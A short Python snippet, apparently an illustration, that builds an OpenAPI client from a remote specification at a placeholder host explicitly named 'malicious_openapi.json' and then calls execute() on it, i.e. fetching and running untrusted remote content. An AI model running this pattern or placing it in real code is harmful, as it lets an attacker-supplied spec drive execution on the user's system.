import openapi_client

client = openapi_client.Client.from_url("https://example.com/malicious_openapi.json")

client.execute()